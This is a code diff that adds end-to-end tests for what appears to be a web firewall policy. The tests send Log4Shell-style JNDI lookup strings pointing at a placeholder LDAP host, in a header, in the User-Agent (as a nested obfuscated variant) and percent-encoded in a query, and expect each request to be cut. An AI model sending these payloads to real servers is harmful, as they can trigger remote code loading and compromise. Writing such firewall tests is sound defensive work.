@@ -36,3 +36,13 @@ export default function ({ f, run, stream, ok, progs, bytes, show, root, readFil
   run(f, "a dollar amount and braces", post("/api", "Content-Type: application/json\r\n", `{"price":"$5","note":"{jndi} is a word"}`), "pass", web);
   run(f, "another port", header(J), "pass", { dport: 80 });
 }
+
+/* Sent through a firewall enforcing this policy with `pfw apply -f` (test/e2e.mjs). */
+const J = "$" + "{jndi:ldap://203.0.113.9/a}";
+const NESTED = "$" + "{$" + "{lower:j}ndi:ldap://203.0.113.9/a}";
+export const e2e = ({ url }) => [
+  { name: "a lookup in a header", curl: ["-H", `X-Api-Version: ${J}`, `${url}/`], want: "cut" },
+  { name: "a nested lookup in the User-Agent", curl: ["-A", NESTED, `${url}/`], want: "cut" },
+  { name: "a percent-encoded lookup in the query", curl: [`${url}/?q=%24%7Bjndi%3Aldap%3A%2F%2F203.0.113.9%2Fa%7D`], want: "cut" },
+  { name: "an ordinary request", curl: ["-H", "X-Api-Version: 2", `${url}/?q=hello`], want: "served" },
+];
